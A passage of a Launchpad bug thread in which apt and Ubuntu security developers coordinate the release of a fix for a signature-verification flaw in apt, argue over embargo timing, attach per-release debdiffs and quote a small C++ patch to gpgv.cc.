          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Sorry about that Marc. There is no real coordination yet, apparently I&#x27;m moving a bit too fast for security teams to keep up :)</p>
<p>We received the bug report yesterday from Google with their usual 90 day disclosure deadline:<br />
&quot;This bug is subject to a 90 day disclosure deadline. If 90 days elapse<br />
without a broadly available patch, then the bug report will automatically<br />
become visible to the public.&quot;</p>
<p>The fix was simpler than I thought as I misunderstood the initial suggestions (it was a list, I thought we needed to do all in it, but just one thing is enough...). My intention is to provide the fixes today for all affected Debian and Ubuntu releases, in the form of debdiffs in this bug for the Ubuntu ones, to enable some work.</p>
<p>That said, I have no idea how much coordination is needed from security folks, so I&#x27;m not sure when we will be able to publicly release it - You guys need to figure that out. I sort of feel offended by security bugs, so I&#x27;d really love to move fast on these :)</p>
<p>I&#x27;m not a fan of responsible disclosure. I consider it an irresponsible practice, but that&#x27;s my personal opinion, and if people want to play the game of withholding fixes until everyone catches up, I&#x27;m willing to play along for a few days, but not very long.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Sorry about that Marc. There is no real coordination yet, apparently I'm moving a bit too fast for security teams to keep up :)

We received the bug report yesterday from Google with their usual 90 day disclosure deadline:
"This bug is subject to a 90 day disclosure deadline. If 90 days elapse
without a broadly available patch, then the bug report will automatically
become visible to the public."

The fix was simpler than I thought as I misunderstood the initial suggestions (it was a list, I thought we needed to do all in it, but just one thing is enough...). My intention is to provide the fixes today for all affected Debian and Ubuntu releases, in the form of debdiffs in this bug for the Ubuntu ones, to enable some work.

That said, I have no idea how much coordination is needed from security folks, so I'm not sure when we will be able to publicly release it - You guys need to figure that out. I sort of feel offended by security bugs, so I'd really love to move fast on these :)

I'm not a fan of responsible disclosure. I consider it an irresponsible practice, but that's my personal opinion, and if people want to play the game of withholding fixes until everyone catches up, I'm willing to play along for a few days, but not very long.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/12" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T13:25:15.350365+00:00" title="2016-12-06 13:25:15 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/12"> #12</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>We&#x27;re going to need a couple of days for testing it before releasing.</p>
<p>Assuming we have the final patches, would a CRD of 2016-12-13 17:00:00 UTC work for everyone?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">We're going to need a couple of days for testing it before releasing.

Assuming we have the final patches, would a CRD of 2016-12-13 17:00:00 UTC work for everyone?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T13:36:10.821824+00:00" title="2016-12-06 13:36:10 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Especially because the fix is so tiny and can easily be applied to any affected apt version, and I only know three distributions shipping a self-built apt (Debian, Ubuntu, Tanglu), I&#x27;d like to get this rolled out in the next 34 hours basically (until Wed 23:59 CET). I&#x27;d be happy extending that to Thu 23:59 CET if that gets a few more distros on board that for whatever reasons ship a self-built apt. But I would not want to hold a fix for Debian and Ubuntu back for longer than that to give 1% or so the time to fix up things, as that would be irresponsible.</p>
<p>Release procedure:</p>
<p>For yakkety, the fix will be a new 1.3.2 &quot;upstream&quot; micro release containing just that fix, so I&#x27;ll just provide a debdiff for that.</p>
<p>For xenial, there will be a new 1.2.18 upstream micro release, but as 1.2.17 is stuck in the queue for proposed, I can also provide a 1.2.15ubuntu0.1 (did I get that right?) debdiff for security. Once the security upload has been done, I&#x27;ll replace 1.2.17 with 1.2.18 in the proposed queue.</p>
<p>For trusty, I will provide a debdiff for 1.0.1ubuntu2.16.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Especially because the fix is so tiny and can easily be applied to any affected apt version, and I only know three distributions shipping a self-built apt (Debian, Ubuntu, Tanglu), I'd like to get this rolled out in the next 34 hours basically (until Wed 23:59 CET). I'd be happy extending that to Thu 23:59 CET if that gets a few more distros on board that for whatever reasons ship a self-built apt. But I would not want to hold a fix for Debian and Ubuntu back for longer than that to give 1% or so the time to fix up things, as that would be irresponsible.

Release procedure:

For yakkety, the fix will be a new 1.3.2 "upstream" micro release containing just that fix, so I'll just provide a debdiff for that.

For xenial, there will be a new 1.2.18 upstream micro release, but as 1.2.17 is stuck in the queue for proposed, I can also provide a 1.2.15ubuntu0.1 (did I get that right?) debdiff for security. Once the security upload has been done, I'll replace 1.2.17 with 1.2.18 in the proposed queue.

For trusty, I will provide a debdiff for 1.0.1ubuntu2.16.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T13:39:18.074627+00:00" title="2016-12-06 13:39:18 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Really - 7 days is like crazy long. The fix is basically a simple matter of checking if errno is 0 and returning false in case it is. What do you want to do 7 days testing it?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Really - 7 days is like crazy long. The fix is basically a simple matter of checking if errno is 0 and returning false in case it is. What do you want to do 7 days testing it?

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T14:05:28.969250+00:00" title="2016-12-06 14:05:28 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4788102/+files/apt_sig_bypass.tar">Reproducer helper</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/apt/+bug/1647467/+attachment/4788102">Edit</a>
        (10.0 KiB,
        application/x-tar)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T15:32:55.098194+00:00" title="2016-12-06 15:32:55 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4788153/+files/apt_1.0.1ubuntu2.16.diff">proposed debdiff for trusty</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/apt/+bug/1647467/+attachment/4788153">Edit</a>
        (2.0 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T15:34:13.522076+00:00" title="2016-12-06 15:34:13 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4788165/+files/apt_1.2.15ubuntu0.1.diff">proposed debdiff for xenial security</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/apt/+bug/1647467/+attachment/4788165">Edit</a>
        (2.8 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T15:36:05.701075+00:00" title="2016-12-06 15:36:05 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4788168/+files/apt_1.3.2.diff">proposed debdiff for yakkety</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/apt/+bug/1647467/+attachment/4788168">Edit</a>
        (12.0 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The yakkety one is basically an upstream release (1.3.2), hence a bit more automated churn in there to update the version number by the build system.</p>
<p>I won&#x27;t attach the one for 1.2.18 for xenial-proposed, as that&#x27;s basically the same as 1.3.2, just against 1.2.17 - and we need to get 1.2.15 done first.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The yakkety one is basically an upstream release (1.3.2), hence a bit more automated churn in there to update the version number by the build system.

I won't attach the one for 1.2.18 for xenial-proposed, as that's basically the same as 1.3.2, just against 1.2.17 - and we need to get 1.2.15 done first.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
    
    <time title="2016-12-06 16:23:12 UTC" datetime="2016-12-06T16:23:12.034343+00:00">on 2016-12-06</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Zesty): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Committed
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T20:41:25.304877+00:00" title="2016-12-06 20:41:25 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Might need some more work with pushing the error stack, so we really only return on errors that occured inside the function and not outside - which _might_ prevent other repositories from updating (or at least, it&#x27;s a weird API).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Might need some more work with pushing the error stack, so we really only return on errors that occured inside the function and not outside - which _might_ prevent other repositories from updating (or at least, it's a weird API).</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Zesty): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Committed &#8594; In Progress
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-07T15:09:55.105423+00:00" title="2016-12-07 15:09:55 UTC">on 2016-12-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Could you please clarify your last comment? Does that mean the proposed fix is incorrect?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Could you please clarify your last comment? Does that mean the proposed fix is incorrect?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-07T16:00:21.044654+00:00" title="2016-12-07 16:00:21 UTC">on 2016-12-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>It might introduce a regression on 1.1 and newer releases (everything but trusty), such that if one repository is attacked, all repositories would be blocked. Sorry, I thought you were CCed on that email, but it seems this was in another sub-thread without an Ubuntu CC.</p>
<p>David wrote we need something like this:</p>
<p>diff --git a/apt-pkg/<wbr />contrib/<wbr />gpgv.cc b/apt-pkg/<wbr />contrib/<wbr />gpgv.cc<br />
index b49569ae6.<wbr />.f9fe6b546 100644<br />
--- a/apt-pkg/<wbr />contrib/<wbr />gpgv.cc<br />
+++ b/apt-pkg/<wbr />contrib/<wbr />gpgv.cc<br />
@@ -315,6 +315,7 @@ bool SplitClearSigne<wbr />dFile(std:<wbr />:string const &amp;InFile, FileFd * const ContentFile,</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;char *buf = NULL;<br />
&nbsp;&nbsp;&nbsp;&nbsp;size_t buf_size = 0;<br />
+   _error-<wbr />&gt;PushToStack(<wbr />);<br />
&nbsp;&nbsp;&nbsp;&nbsp;while (GetLineErrno(&amp;buf, &amp;buf_size, in, InFile) != -1)<br />
&nbsp;&nbsp;&nbsp;&nbsp;{<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />_strrstrip(<wbr />buf);<br />
@@ -386,9 +387,10 @@ bool SplitClearSigne<wbr />dFile(std:<wbr />:string const &amp;InFile, FileFd * const ContentFile,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />ContentFile-<wbr />&gt;Flush(<wbr />);</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;// An error occured during reading - propagate it up<br />
-   if (_error-<wbr />&gt;PendingError(<wbr />)) {<br />
+   bool const hasErrored = _error-<wbr />&gt;PendingError(<wbr />);<br />
+   _error-<wbr />&gt;MergeWithStack<wbr />();<br />
+   if (hasErrored)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;<br />
-   }</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;if (found_signature == true)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return _error-<wbr />&gt;Error(<wbr />&quot;Signature in file %s wasn&#x27;t closed&quot;, InFile.c_str());</p>
<p>I&#x27;ll add that tomorrow morning, and then we can eye for a release next week, so you can get your proposed date if nobody disagrees :)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">It might introduce a regression on 1.1 and newer releases (everything but trusty), such that if one repository is attacked, all repositories would be blocked. Sorry, I thought you were CCed on that email, but it seems this was in another sub-thread without an Ubuntu CC.

David wrote we need something like this:

diff --git a/apt-pkg/contrib/gpgv.cc b/apt-pkg/contrib/gpgv.cc
index b49569ae6..f9fe6b546 100644
--- a/apt-pkg/contrib/gpgv.cc
+++ b/apt-pkg/contrib/gpgv.cc
@@ -315,6 +315,7 @@ bool SplitClearSignedFile(std::string const &amp;InFile, FileFd * const ContentFile,

    char *buf = NULL;
    size_t buf_size = 0;
+   _error-&gt;PushToStack();
    while (GetLineErrno(&amp;buf, &amp;buf_size, in, InFile) != -1)
    {
       _strrstrip(buf);
@@ -386,9 +387,10 @@ bool SplitClearSignedFile(std::string const &amp;InFile, FileFd * const ContentFile,
       ContentFile-&gt;Flush();

    // An error occured during reading - propagate it up
-   if (_error-&gt;PendingError()) {
+   bool const hasErrored = _error-&gt;PendingError();
+   _error-&gt;MergeWithStack();
+   if (hasErrored)
       return false;
-   }

    if (found_signature == true)
       return _error-&gt;Error("Signature in file %s wasn't closed", InFile.c_str());


I'll add that tomorrow morning, and then we can eye for a release next week, so you can get your proposed date if nobody disagrees :)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/22" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
